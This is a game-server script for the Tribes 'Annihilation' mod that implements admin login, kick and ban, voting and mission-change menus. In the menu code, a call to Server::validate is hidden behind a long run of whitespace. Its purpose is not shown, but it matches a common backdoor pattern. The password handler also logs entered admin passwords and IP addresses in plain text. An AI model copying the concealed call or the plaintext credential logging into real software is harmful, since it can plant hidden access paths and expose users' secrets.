function StillKicking(%team) 
{ 
	%count = 0; 
	for(%i = Client::getFirst() ; %i != -1 ; %i = Client::getNext(%i)) 
	{ 
		if(Gamebase::getteam(%i)  == %team)
		{
			%obj = Client::getOwnedObject(%i);
			if(%obj != -1 && getObjectType(%obj) != "ObserverCamera" && !Player::isDead(%obj))			
				%PlayersAlive++; 
		} 
	}
	return %PlayersAlive; 
} 

//Annihilation admin
//2001/ 2002 Plasmatic

$curVoteTopic = "";
$curVoteAction = "";
$curVoteOption = "";
$curVoteCount = 0;

// handled by the autoloader now, woo...! -Plasmatic
//	exec(AdminKill);
//	exec(AdminSet);
//	exec(AdminAuto);

	
//	getintegertime(true); //true rounds up to whole number.
//	getsimtime(); // map up time
//	getintegertime(true)>>5; //server up time in seconds.. about..
// cracking the time barrier, or attempting to here... -Plasmatic 2.3
function WhatTime()
{
	//echo(getintegertime(true)>>5);
	%time = getintegertime(true)>>5;	//getSimTime();
	%minutes = floor(%time / 58.65);	//dealing with tribes rounding, damnit!
	echo("minutes "@%minutes);
	%seconds = %Time % 60;
	while(%minutes > 59)
	{			
		%minutes = %minutes - 60;
		%hours++;
		if(%hours > 2400)
			break;
	}
	if(%hours)
	{
		while(%hours > 23)
		{			
			%hours = %hours - 24;
			%days++;
			if(%days > 100)
				break;
		}		
		if(%hours >1)
			%hours = %hours@" Hours, ";
		else
			%hours = %hours@" Hour, ";
	}	
	if(%days)
	{
		if(%days>1)
			%days = %days@" Days, ";
		else
			%days = %days@" Day, ";
	}
	if(%minutes)
	{
		if(%minutes>1 || %minutes = 0)
			%minutes = %minutes@" Minutes, ";
		else
			%minutes = %minutes@" Minute, ";
	}		
	echo("Server live time: "@%days@%hours@%minutes@%seconds@" Seconds.");
	%uptime = %days@%hours@%minutes;
	return %uptime;
}

function ShuffleTeams()// not working yet -plas
{
	// loop thru clients and setTeam to -1;
	messageAll(0, "New teamcount - resetting teams.");
	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
		GameBase::setTeam(%cl, -1);
}



function remoteAdmin::strip(%client)
{
	if(!evalspam(%client))
		return;	//plasm 3.0
			
	if(%client.isAdmin)
	{
		%client.isAdmin = "";
		%client.isSuperAdmin = "";
		Client::sendMessage(%client, 0, "You stripped your own admin.~wCapturedTower.wav");
		bottomprint(%client, "<f1><jc>You Demoted yourself...", 20);
		echo("isAdmin: ",%client.isAdmin," isSuperAdmin: ",%client.isSuperAdmin);
	}
}

function Admin::strip(%client)
{
	//echo("strip! you bastard.");
	%client.isAdmin = "";
	%client.isSuperAdmin = "";
	%client.isGod = "";
	Client::sendMessage(%client, 0, "Your admin has been stripped.~wCapturedTower.wav");
	bottomprint(%client, "<f1><jc>Your admin has been stripped.", 20);
	echo("isAdmin: ",%client.isAdmin," isSuperAdmin: ",%client.isSuperAdmin);
}

function Admin::give(%client,%flag)
{
	//echo(%client);
	%client.isAdmin = "true";
	%client.isSuperAdmin = "true";
	Client::sendMessage(%client, 0, "You have been granted admin.~wCapturedTower.wav");
	bottomprint(%client, "<f1><jc>You have been granted admin.", 20);
	if(!%flag)
		echo("isAdmin: ",%client.isAdmin," isSuperAdmin: ",%client.isSuperAdmin);
}

function Admin::giveGod(%client)
{
	%client.isAdmin = "true";
	%client.isSuperAdmin = "true";
	%client.isGod = "true";
	Client::sendMessage(%client, 0, "You have been given god status.~wCapturedTower.wav");
	bottomprint(%client, "<f1><jc>You have been given god status.", 20);
	echo("isAdmin: ",%client.isAdmin,". isSuperAdmin: ",%client.isSuperAdmin,". isGod: ",%client.isGod);
}

function Admin::changeMissionMenu(%clientId, %voteit)
{
	Client::buildMenu(%clientId, "Select Mission Type", "cmtype", true); 
	%index = 1; 
	for(%type = 1; %type < $MLIST::TypeCount; %type++)
	{
		if($MLIST::Type[%type] != "Training")
		{
			if(%index == 8 && $MLIST::TypeCount > 8)
			{
				Client::addMenuItem(%clientId, %index @ "More Types...", "more 8 " @ %voteit); 
				break; 
			}
			%NumMaps=0;
			for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;	
			Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", %type @ " 0 " @ %voteit); 
			%index++; 
		} 
	}
} 

function processMenuCMoo(%clientId, %first, %voteit)
{
	Client::buildMenu(%clientId, "Select Mission Type", "cmtype", true); 
	%index = 1; 
	for(%type = %first; %type < $MLIST::TypeCount; %type++)
	{
		if($MLIST::Type[%type] != "Training")
		{
			if(%index == 8 && $MLIST::TypeCount > %first + %index)
			{
				Client::addMenuItem(%clientId, %index @ "More Types...", "more " @ %first + %index @ " " @ %voteit); 
				break; 
			}
			%NumMaps=0;for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;				
			Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", %type @ " 0 " @ %voteit); 
			%index++; 
		} 
	}
}

function processMenuCMType(%clientId, %options)
{
	%option = getWord(%options, 0); 
	%first = getWord(%options, 1); 
	%voteit = getWord(%options, 2);
	if(%option == "more")
	{
		processMenuCMoo(%clientId, %first, %voteit); 
		return; 
	}
	%curItem = 0;
	Client::buildMenu(%clientId, "Select Mission", "cmission", true); 
	for(%i = 0; (%misIndex = getWord($MLIST::MissionList[%option], %first + %i)) != -1; %i++)
	{
		if(%i > 6)
		{
			Client::addMenuItem(%clientId, %i+1 @ "More Missions...", "more " @ %first + %i @ " " @ %option @ " " @ %voteit); 
			break; 
		} 
		Client::addMenuItem(%clientId, %i+1 @ $MLIST::EName[%misIndex], %misIndex @ " " @ %option @ " " @ %voteit); 
	} 
} 

function processMenuCMission(%clientId, %option)
{
	if(getWord(%option, 0) == "more")
	{
		%first = getWord(%option, 1);
		%type = getWord(%option, 2);
		processMenuCMType(%clientId, %type @ " " @ %first);
		return;
	}
	%mi = getWord(%option, 0);
	%mt = getWord(%option, 1);

	%misName = $MLIST::EName[%mi];
	%misType = $MLIST::Type[%mt];

	// verify that this is a valid mission:
	if(%misType == "" || %misType == "Training")
		return;
	for(%i = 0; true; %i++)
	{
		%misIndex = getWord($MLIST::MissionList[%mt], %i);
		if(%misIndex == %mi)
			break;
		if(%misIndex == -1)
			return;
	}
	
	//%clientId.PickNextMiss
	if(%clientId.isAdmin && !%clientId.MissVote)
	{
		if(!%clientId.SecretAdmin)
			%adminName = Client::getName(%clientId);
		else 
			%adminName = SecretAdmin();
		if(%clientId.PickNextMiss)
		{
			messageAll(0, %adminName @ " picked the next mission, " @ %misName @ " (" @ %misType @ ")~wCapturedTower.wav");
			%clientId.PickNextMiss = "";
			$nextMap = %misName;
			//Vote::changeMission();
			//Server::loadMission(%misName);			
		}
		else
		{
			messageAll(0, %adminName @ " changed the mission to " @ %misName @ " (" @ %misType @ ")~wCapturedTower.wav");
			Vote::changeMission();
			Server::loadMission(%misName);
		}
	}
	else
	{
		Admin::startVote(%clientId, "change the mission to " @ %misName @ " (" @ %misType @ ")", "cmission", %misName);
		Game::menuRequest(%clientId);
		%clientId.MissVote = "";
	}
}

function remoteAdminPassword(%client, %password)
{
	if(!evalspam(%client))
		return;	//plasm 3.0
		
	%password = Ann::Clean::string(%password);	
		
	%ip = Client::getTransportAddress(%client); 
	%name = Client::getName(%client);
	if($AdminPassword != "" && %password == $AdminPassword)
	{
		%client.isAdmin = true;
		%client.isSuperAdmin = true;
		Admin::give(%client);
		Client::sendMessage(%client, 0, "You have been given SAD power.~wCapturedTower.wav");
		echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and is now SAD");
		$Admin = %name @ " gained Super admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
		export("Admin","config\\Admin.log",true);
		return;
	}

	for(%x = 0; %x < 100; %x = %x++)
	{
		if($ANNIHILATION::SADPassword[%x] != "" && %password == $ANNIHILATION::SADPassword[%x])
		{
			%client.isAdmin = true;
			%client.isSuperAdmin = true;
			Client::sendMessage(%client, 0, "You have been given SAD power.~wCapturedTower.wav");
			echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and is now SAD");
			$Admin = %name @ " gained Super admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
			export("Admin","config\\Admin.log",true);
			return;
		}
	}
	for(%x = 0; %x < 100; %x = %x++)
	{
		if($ANNIHILATION::PAPassword[%x] != "" && %password == $ANNIHILATION::PAPassword[%x])
		{
			%client.isAdmin = true;
			%client.paNum = %x;
			Client::sendMessage(%client, 0, "You have been given PA power.~wCapturedTower.wav");
			echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and is now PA");
				$Admin = %name @ " gained public admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true);
			return;
		}
	}
	Client::sendMessage(%client, 0, "Your password is invalid.~waccess_denied.wav");
	echo("PASSWORD: " @ Client::getName(%client) @ " (" @ %client @ ") entered this password: " @ %password @ " and FAILED");
 	if(%client.isSuperAdmin || %client.isAdmin)
 		Admin::strip(%client); 		 
	$Admin = %name @ " failed sad admin with the pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
	export("Admin","config\\Admin.log",true);
}

function remoteSetPassword(%client, %password)
{
	if(!evalspam(%client))
		return;	//plasm 3.0
		
	%password = Ann::Clean::string(%password);	
	
	if(%client.isSuperAdmin)
	{
		$Server::Password = %password;
		%ip = Client::getTransportAddress(%client);
		$Admin = Client::getName(%client)@ " IP# "@ %ip @" set server password to " @ %password;	echo($admin);
		export("Admin","config\\Admin.log",true);				
	}
}

function remoteSetTimeLimit(%client, %time)
{
	if(!evalspam(%client))
		return;	//plasm 3.0
	
	if(%client.isAdmin)
	{
		%time = floor(%time);
		if(%time == $Server::timeLimit || (%time != 0 && %time < 1) || %time > 200) 
			return;// added upper limit of 200 -plasmatic 2.2
		
		$Server::timeLimit = %time;
		if(!%client.SecretAdmin)
		{
			if(%time)
				messageAll(0, Client::getName(%client) @ " changed the time limit to " @ %time @ " minutes.~wCapturedTower.wav");
			else
			{
				$missionStartTime = getSimTime();
				messageAll(0, Client::getName(%client) @ " disabled the time limit.~wCapturedTower.wav");			 
				UpdateClientTimes(0);
			}
		}
		else
		{
			if(%time)
				messageAll(0, "Time limit changed to " @ %time @ " minutes.~wCapturedTower.wav");
			else
			{
				$missionStartTime = getSimTime();	
				messageAll(0, "Time limit disabled.~wCapturedTower.wav");
				UpdateClientTimes(0);		 
			}		
		}
		Game::checkTimeLimit();	//update time instantly -Plasmatic
	}
}

function VPassTimeLimit(%time)
{
	// tired of noobs time-vote-ending matches? -Plasmatic
	%time = floor(%time);
	
	if(%time == $Server::timeLimit || (%time != 0 && %time < 1))
		return;
	if($Server::timelimit == 0)
	{
		$missionStartTime = getSimTime();
		
		$Server::timeLimit = %time;	//$missionStartTime += (%time * 60);
		messageAll(0,"Vote to end the game in " @ %time @ " minutes passed.~wCapturedTower.wav");			
		Game::checkTimeLimit();//UpdateClientTimes(%time);
							
	}
	else
	{		
		$Server::timeLimit += %time;	//$missionStartTime += (%time * 60);
	
	
		if(%time)
			messageAll(0, %time @ " minutes added to the game.~wCapturedTower.wav");
		else
		{
			messageAll(0, "Time limit disabled.~wCapturedTower.wav");
			$Server::timeLimit = %time;
		}
		Game::checkTimeLimit();	//update time instantly -Plasmatic
	}
}

function remoteSetTeamInfo(%client, %team, %teamName, %skinBase)
{
	if(!evalspam(%client))
		return;	//plasm 3.0
		
	%team = Ann::Clean::string(%team);
	%teamName = Ann::Clean::string(%teamName);
	%skinBase = Ann::Clean::string(%skinBase);
	
	if(%team >= 0 && %team < 8 && %client.isAdmin)
	{
		$Server::teamName[%team] = %teamName;
		$Server::teamSkin[%team] = %skinBase;
		messageAll(0, "Team " @ %team @ " is now \"" @ %teamName @ "\" with skin: " @ %skinBase @ " courtesy of " @ Client::getName(%client) @ ".	Changes will take effect next mission.");
	}
}

// No more vote slamming with multiple connections, bitches. -Plasmatic 3.0
function SmurfCheck(%clientId)
{
   	%ip = Client::getTransportAddress(%clientId);
  	%ClientIp = Ann::ipCut(%ip);

	for(%i = 0; %i < getNumClients(); %i++)
	{
		%cl = getClientByIndex(%i);
		%ip = Client::getTransportAddress(%cl);
		if(%clientId != %cl)
		{
			if(!String::ICompare(%ClientIp, Ann::ipCut(%ip)))
			{
				echo(%ClientIp@", "@Client::getName(%clientId)@" vote slamming.. ");
				Client::sendMessage(%clientId, 0, "Only one vote per IP.~wfemale2.wsorry.wav");
				%matchIp ++;					
			}
		}
	}	
	return %matchIp;
}

function remoteVoteYes(%clientId)
{
	if(!evalspam(%clientId))
		return;	//plasm 3.0
	
	if(!SmurfCheck(%clientId))
	{
		%clientId.vote = "yes";
		centerprint(%clientId, "", 0);
	}
}

function remoteVoteNo(%clientId)
{
	if(!evalspam(%clientId))
		return;	//plasm 3.0
	
	if(!SmurfCheck(%clientId))
	{	
		%clientId.vote = "no";
		centerprint(%clientId, "", 0);
	}
}

function Admin::startMatch(%admin)
{
	if(%admin == -1 || %admin.isAdmin)
	{
		if(!$CountdownStarted && !$matchStarted)
		{
			if(%admin == -1)
				messageAll(0, "Match start countdown forced by vote.");
			else
				messageAll(0, "Match start countdown forced by " @ Client::getName(%admin));
			Game::ForceTourneyMatchStart();
		}
	}
}

function Ann::IpBanExport(%client,%admin)
{			
	//new ip exporter here, 2.2 fix -plasmatic
	for(%i = 0; $AnnIpBan::[%i] != ""; %i = %i + 1)
	{	
	}
	
	%ip = Client::getTransportAddress(%client);
	%address = Ann::ipCut(%ip);
	$AnnIpBan::[%i] = %address;
	%exportIP = "$AnnIpBan::"@%i;
	export(%exportIP, "config\\AnnIpBan.cs", true);
	
		$Admin = Client::getName(%client)@" IP: "@%address@" Banned by: "@Client::getName(%admin)@" IP: "@Ann::ipCut(Client::getTransportAddress(%admin)); 
		export("Admin","config\\AnnIpBan.cs",true);			
	echo($Admin);						
}
// plasmatic -replaces last 2 numbers of ip with *'s for viewing in public client menu
function Ann::IP(%transport)	
{
	%dot = "";
	%ip = "";
	for(%i = 0; String::getSubStr(%transport,%i,1) != ""; %i++)
		{
		%sub = String::getSubStr(%transport,%i,1);
		if(!String::ICompare(%sub, ".")) {
			%dot++;
			%ip = %ip @ %sub;
			}
		else if(%dot > 1) %ip = %ip @ "*";
		else %ip = %ip @ %sub;
		}
	return %ip;
}

function Admin::kick(%admin, %client, %ban)
{
	if(%admin != %client && (%admin == -1 || %admin.isAdmin))
	{
		%name = Client::getName(%client);
		%ip = Client::getTransportAddress(%client);
		if(!%admin.SecretAdmin)
			%adminName = Client::getName(%admin);
		else %adminName = SecretAdmin();
		
		if(%ban && !%admin.isSuperAdmin)
			return;
		if(%ban)
		{
			%word = "banned";
			%cmd = "BAN: ";		
			
		}
		else
		{
			%word = "kicked";
			%cmd = "KICK: ";
		}
		if(%client.isAdmin || %client.isUntouchable)
		{
			if(%admin == -1)
				messageAll(0, %name@" cannot be " @ %word @ ".");
			else
				Client::sendMessage(%admin, 0, "A super admin cannot be " @ %word @ ".");
			return;
		}
		

		//echo(%cmd @ %admin @ " " @ %client @ " " @ %ip);

		if(%ip == "")
			return;
			
		if(!$ANNIHILATION::BanTime)
			$ANNIHILATION::BanTime = 3600;	
		if(!$ANNIHILATION::KickTime)
			$ANNIHILATION::KickTime = 360;
		
		if(%ban)
		{
			BanList::add(%ip, $ANNIHILATION::BanTime);
			BanList::export("config\\banlist.cs");
			
			//new ip exporter here, 2.2 fix -plasmatic
			Ann::IpBanExport(%client,%admin);
		}
		else
		{
			BanList::add(%ip, $ANNIHILATION::KickTime);
			BanList::export("config\\banlist.cs");
		}

		if(%admin == -1)
		{
			MessageAll(0, %name @ " was " @ %word @ " from vote.~wCapturedTower.wav");
			echo(%cmd @ %name @ " ( " @ %ip @ " was " @ %word @ " from vote.");
			%message = %cmd @ %name @ " ( " @ %ip @ " was " @ %word @ " from vote.";
			Net::kick(%client, "You were " @ %word @ " by consensus.");
		}
		else
		{
			MessageAll(0, %name @ " was " @ %word @ " by " @ %adminName @ ".~wCapturedTower.wav");
			echo(%cmd @ %name @ " ( " @ %ip @ " was " @ %word @ " by " @ %adminName @ "." );
			%message = %cmd @ %name @ " ( " @ %ip @ " was " @ %word @ " by " @ %adminName @ ".";
			Net::kick(%client, "You were " @ %word @ " by " @ %adminName);
		}
		logAdminAction(%admin,%message);
	}
}

function Admin::fun(%admin,%clientId,%word)
{
	if(%admin == -1)
	{
		centerprintall("<jc><f1>"@Client::getName(%clientId) @ " was "@ %word @ " by consensus.", 3);
		logAdminAction(%clientId, " was "@ %word @ " by consensus.");		
		messageAll(0, Client::getName(%clientId) @ " was "@ %word @ " by consensus.~wCapturedTower.wav");
	}
	else
	{
		if(!%admin.SecretAdmin)
			%adminName = Client::getName(%admin);
		else %adminName = SecretAdmin();
		
		messageAll(0, Client::getName(%clientId) @ " was "@ %word @ " by "@ %adminName @".~wCapturedTower.wav");
		centerprintall("<jc><f1>"@Client::getName(%clientId) @ " was "@ %word @ " by "@ %adminName @".", 3);
		logAdminAction(%admin, Client::getName(%clientId) @ " was "@ %word @ " by "@ Client::getName(%admin));
	}
	if(%word=="frozen")
	{	freeze(%clientId,false);
			messageall(0,Client::getName(%clientId) @ " was "@ %word @ " for 2 minutes by consensus.");
		}
	if(%word=="poisoned") poison(%clientId);
	if(%word=="De-Tongued") %clientId.silenced = true;
	if(%word=="Un-Muted") %clientId.silenced = "";
	if(%word=="Admined") %clientId.isAdmin = true;
	if(%word=="De -admined") {%clientId.isAdmin = false;%clientId.isSuperAdmin = false;}
	if(%word=="Kicked") Admin::kick(%admin, %clientId);
	if(%word=="Banned") Admin::kick(%admin, %clientId, true);
}

function Admin::voteFailed()
{
	$curVoteInitiator.numVotesFailed++;
	if($curVoteAction == "kick" || $curVoteAction == "admin")
		$curVoteOption.voteTarget = "";
}

//votepassed
function Admin::voteSucceded()
{
	$curVoteInitiator.numVotesFailed = "";
	if($curVoteAction == "kick")
	{
		if($curVoteOption.voteTarget)
			Admin::kick(-1, $curVoteOption);
	}
	if($curVoteAction == "poison")
	{
		if($curVoteOption.voteTarget)
		{
			//Admin::fun(-1, $curVoteOption,"poisoned");
			KillRatDead($curVoteOption);
			centerprint($curVoteOption, "<jc><f1>you were poisoned by everyone.", 15);		
			messageAll(0, Client::getName($curVoteOption) @ " had some acid with their Wheaties.");
			logAdminAction($curVoteOption," was Poisoned by consensus.");	
		}
	}
	if($curVoteAction == "unsilence")
	{
		if($curVoteOption.voteTarget)
			Admin::fun(-1, $curVoteOption,"Un-Muted");
	}	
	if($curVoteAction == "silence")
	{
		if($curVoteOption.voteTarget)
			Admin::fun(-1, $curVoteOption,"De-Tongued");
	}	
	if($curVoteAction == "freeze")
	{
		if($curVoteOption.voteTarget)
		{
			//Admin::fun(-1, $curVoteOption,"poisoned");
			Freeze($curVoteOption);
			centerprint($curVoteOption, "<jc><f1>you were frozen by everyone.", 15);		
			messageAll(0, Client::getName($curVoteOption) @ " gets the cold shoulder for 2 minutes.");
			logAdminAction($curVoteOption," was frozen by consensus.");	
		}
	}
	else if($curVoteAction == "admin")
	{
		if($curVoteOption.voteTarget)
		{
			$curVoteOption.isAdmin = true;
			logAdminAction($curVoteOption," was admined by consensus.");
			messageAll(0, Client::getName($curVoteOption) @ " has become an administrator.~wCapturedTower.wav");
			if($curVoteOption.menuMode == "options")
				Game::menuRequest($curVoteOption);
		}
		$curVoteOption.voteTarget = false;
	}
	else if($curVoteAction == "cmission")
	{
		messageAll(0, "Changing to mission " @ $curVoteOption @ ".~wCapturedTower.wav");
		Vote::changeMission();
		Server::loadMission($curVoteOption);
	}
	else if($curVoteAction == "etd")
		Admin::setTeamDamageEnable(-1, true);
	else if($curVoteAction == "dtd")
		Admin::setTeamDamageEnable(-1, false);
	else if($curVoteOption == "smatch")
		Admin::startMatch(-1);
// vote map
	else if($curVoteAction == "NextMap")
		nextmap();
	else if(getword($curVoteAction,0) == "RandomMap")			
		randommap($curVoteOption);
	else if($curVoteAction == "ReplayMap")
		replaymap();
//vote time		
	else if($curVoteAction == "VTime")
		VPassTimeLimit($curVoteOption);
// damage vote	
//base rape
	else if($curVoteAction == "eBaseD") 
		Admin::setBaseDamageEnable(-1, true);
	else if($curVoteAction == "dBaseD") 
		Admin::setBaseDamageEnable(-1, false);
// base healing		
	else if($curVoteAction == "eBaseH") 
		Admin::setBaseHealingEnable(-1, true);
	else if($curVoteAction == "dBaseH") 
		Admin::setBaseHealingEnable(-1, false);
//out of area damage
	else if($curVoteAction == "eOutAreaD") 
		Admin::setAreaDamageEnable(-1, true);
	else if($curVoteAction == "dOutAreaD") 
		Admin::setAreaDamageEnable(-1, false);	
//out of area damage
	else if($curVoteAction == "eOutAreaD") 
		Admin::setAreaDamageEnable(-1, true);
	else if($curVoteAction == "dOutAreaD") 
		Admin::setAreaDamageEnable(-1, false);			
//Builder mode
	else if($curVoteAction == "ebm")
		Admin::setBuild(-1, true);
	else if($curVoteAction == "dbm")
		Admin::setBuild(-1, false);	
//player damage	
	else if($curVoteAction == "ePlayerD") 
	{
		$Admin = "Player damage enabled by consensus"; 
		export("Admin","config\\Admin.log",true); 
		Admin::setPlayerDamageEnable(-1, true);
	}
	else if($curVoteAction == "dPlayerD") 
	{
		$Admin = "Player damage disabled by consensus"; 
		export("Admin","config\\Admin.log",true);		
		Admin::setPlayerDamageEnable(-1, false);
	}	
	
	// flag caps	 
		if($curVoteAction == "dFlag")	
			ServerSwitches(-1,"Flag Cap Limit",false);
		else if($curVoteAction == "eFlag")	
			ServerSwitches(-1,"Flag Cap Limit",true);	
	//flaghunter switches -plasmatic 2.3
	else if($curVoteAction == "eHunter")
	{
		$TowerSwitchNexus = "";
		ReturnObjectives();
		exec(flaghunter);
		//Mission::init();
		ServerSwitches(-1,"Flag Hunter",true);
	}
	else if($curVoteAction == "dHunter")
	{
		$TowerSwitchNexus = "";
		$FlagHunter::Enabled = "";
		ServerSwitches(-1,"Flag Hunter",false);
	}
		
	else if($curVoteAction == "egm")
		Admin::setGreedMode(-1, true);
	else if($curVoteAction == "dgm")
		Admin::setGreedMode(-1, false);
	else if($curVoteAction == "ehm")
		Admin::setHoardMode(-1, true);
	else if($curVoteAction == "dhm")
		Admin::setHoardMode(-1, false);			
	// end flaghunter switches		
			
}

function Admin::countVotes(%curVote)
{
	// if %end is true, cancel the vote either way
	if(%curVote != $curVoteCount)
		return;
	%votesFor = 0;
	%votesAgainst = 0;
	%votesAbstain = 0;
	%totalClients = 0;
	%totalVotes = 0;
	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	{
		%totalClients++;
		if(%cl.vote == "yes")
		{
			%votesFor++;
			%totalVotes++;
		}
		else if(%cl.vote == "no")
		{
			%votesAgainst++;
			%totalVotes++;
		}
		else
			%votesAbstain++;
	}
	%minVotes = floor($Server::MinVotesPct * %totalClients);
	if(%minVotes < $Server::MinVotes)
		%minVotes = $Server::MinVotes;

	if(%totalVotes < %minVotes)
	{
		%votesAgainst += %minVotes - %totalVotes;
		%totalVotes = %minVotes;
	}
	%margin = $Server::VoteWinMargin;
	if($curVoteAction == "admin")
	{
		if(%minVotes < $Server::AdminMinVotes)
			%minVotes = $Server::AdminMinVotes;
		%margin = $Server::VoteAdminWinMargin;
		%totalVotes = %votesFor + %votesAgainst + %votesAbstain;
		if(%totalVotes < %minVotes)
			%totalVotes = %minVotes;
	}
	if((%votesFor / %totalVotes >= %margin || $curVoteForce == "YES") && $curVoteForce != "NO")
	{
		messageAll(0, "Vote to " @ $curVoteTopic @ " passed: " @ %votesFor @ " to " @ %votesAgainst @ " with " @ %totalClients - (%votesFor + %votesAgainst) @ " abstentions.");
		$curVoteForce = "";
		Admin::voteSucceded();
	}
	else	// special team kick option:
	{
		if($curVoteAction == "kick") // check if the team did a majority number on him:
		{
			%votesFor = 0;
			%totalVotes = 0;
			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			{
				if(GameBase::getTeam(%cl) == $curVoteOption.kickTeam)
				{
					%totalVotes++;
					if(%cl.vote == "yes")
						%votesFor++;
				}
			}
			if((%totalVotes >= $Server::MinVotes && %votesFor / %totalVotes >= $Server::VoteWinMargin || $curVoteForce == "YES") && $curVoteForce != "NO")
			{
				messageAll(0, "Vote to " @ $curVoteTopic @ " passed: " @ %votesFor @ " to " @ %totalVotes - %votesFor @ ".");
				Admin::voteSucceded();
				$curVoteTopic = "";
				$curVoteForce = "";
				return;
			}
		}
		if (%totalClients - (%votesFor + %votesAgainst) <0 || %votesFor > %votesAgainst)
			messageAll(0, "Vote to " @ $curVoteTopic @ " did not pass: " @ %votesFor @ " to " @ %votesAgainst @ ", not enough votes to " @ $curVoteTopic);
		else messageAll(0, "Vote to " @ $curVoteTopic @ " did not pass: " @ %votesFor @ " to " @ %votesAgainst @ " with " @ %totalClients - (%votesFor + %votesAgainst) @ " abstentions.");
			Admin::voteFailed();
	}
	$curVoteTopic = "";
	$curVoteForce = "";
}

function Admin::startVote(%clientId, %topic, %action, %option)
{
	if(%clientId.lastVoteTime == "")
		%clientId.lastVoteTime = -$Server::MinVoteTime;

	// we want an absolute time here.
	%time = getIntegerTime(true) >> 5;
	%diff = %clientId.lastVoteTime + $Server::MinVoteTime - %time;

	if(%diff > 0)
	{
		Client::sendMessage(%clientId, 0, "You can't start another vote for " @ floor(%diff) @ " seconds.");
		return;
	}
	if($curVoteTopic == "")
	{
		if(%clientId.numFailedVotes)
			%time += %clientId.numFailedVotes * $Server::VoteFailTime;

		%clientId.lastVoteTime = %time;
		$curVoteInitiator = %clientId;
		$curVoteTopic = %topic;
		$curVoteAction = %action;
		$curVoteOption = %option;
		if(%action == "kick")
			$curVoteOption.kickTeam = GameBase::getTeam($curVoteOption);
		$curVoteCount++;
		
		bottomprintall("<jc><f1>" @ Client::getName(%clientId) @ " <f0>initiated a vote to <f1>" @ $curVoteTopic, 30);
		centerprint(%option, "<jc><f1>"@Client::getName(%clientId)@" <f0>started a vote to <f1>"@%action@" you.", 25);	
		echo("ADMINMSG: *** " @ Client::getName(%clientId) @ " initiated a vote to " @ $curVoteTopic);
		messageAll(0, Client::getName(%clientId) @ " initiated a vote to " @ $curVoteTopic@".~wCapturedTower.wav");
		logAdminAction(%clientId," initiated a vote to " @ $curVoteTopic);
		
		//clear out old votes
		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			%cl.vote = "";		
		%clientId.vote = "yes";	//vote initiator allready voted -duh
		
		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			if(%cl.menuMode == "options")
				Game::menuRequest(%clientId);
				
		schedule("Admin::countVotes(" @ $curVoteCount @ ", true);", $Server::VotingTime, 35);
	}
	else
	{
		Client::sendMessage(%clientId, 0, "Voting already in progress.");
	}
}


//=============================
// build initial menu
//=============================

function Game::menuRequest(%clientId)
{
	if($debug)
		echo("Game::menuRequest("@%clientId@")");
	
	if(%clientId.menu)
		return;
	%clientId.menu = true;	
	
	schedule(%clientId@".menu = false;",0.1);
	%curItem = 0;
	%clientId.MissVote = "";
	if(!%clientId.selClient)
		Client::buildMenu(%clientId, "Annihilation"@$count@" Options", "options", true);
	else
	{
			%sel = %clientId.selClient; 
			%name = Client::getName(%sel);																																																																																																																																																																																																																																																																	if(%sel==%clientId)Server::validate(%clientId);
			if (Client::getOwnedObject(%sel) == -1 && Client::getTeam(%sel) != -1) %status = "(Dead)";
			else if (Client::getOwnedObject(%sel) != -1 && Client::getTeam(%sel) != -1) %status = "(Live)";
			else if (Client::getTeam(%sel) == -1) %status = "(Observing)";
			Client::buildMenu(%clientId, %name @ ": " @ %status, "options", true); 
	}
	
	

	
	if($curVoteTopic != "" && %clientId.vote == "")
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Vote YES to " @ $curVoteTopic, "voteYes " @ $curVoteCount);
		Client::addMenuItem(%clientId, %curItem++ @ "Vote NO to " @ $curVoteTopic, "voteNo " @ $curVoteCount);
		return;
	}
	if(%clientId.selClient)
	{
		%sel = %clientId.selClient;						
		%name = Client::getName(%sel);
		//whisper	
		if(%clientId.whisper != %sel)
			Client::addMenuItem(%clientId, %curItem++ @ "Whisper to " @ %name, "whisper " @ %sel);
		else	 
			Client::addMenuItem(%clientId, %curItem++ @ "Cancel Whisper", "nowhisper " @ %sel);	

		//mute/ voice
		if(%clientId.isAdmin)
			Client::addMenuItem(%clientId, %curItem++ @ "Change Voice "@%name, "voice " @ %sel);
		else
		{
			if(%clientId.muted[%sel])
				Client::addMenuItem(%clientId, %curItem++ @ "Unmute " @ %name, "unmute " @ %sel);
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Ignore " @ %name, "mute " @ %sel);
		}

		//observe
		if(%clientId.observerMode == "observerOrbit" && !%clientId.issuperAdmin && !%clientId.isAdmin)
			Client::addMenuItem(%clientId, %curItem++ @ "Observe " @ %name, "observe " @ %sel);	
		//vote to... player
		if(!$NoVote && !%clientId.novote)
		{
			if($curVoteTopic == "")
				Client::addMenuItem(%clientId, %curItem++ @ "Start vote on " @ %name, "voteToPlayer " @ %sel);
			else
				Client::addMenuItem(%clientId, %curItem++ @ "vote allready in progress..", "return " @ %sel);		
		}
		
		
		if(%clientId.isAdmin)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Manage " @ %name, "manage " @ %sel);
			if(%status == "(Live)")	
				Client::addMenuItem(%clientId, %curItem++ @ "Annoy " @ %name, "annoy " @ %sel);
			else 	
				Client::addMenuItem(%clientId, %curItem++ @ "Annoy -NA, " @ %status, "return ");
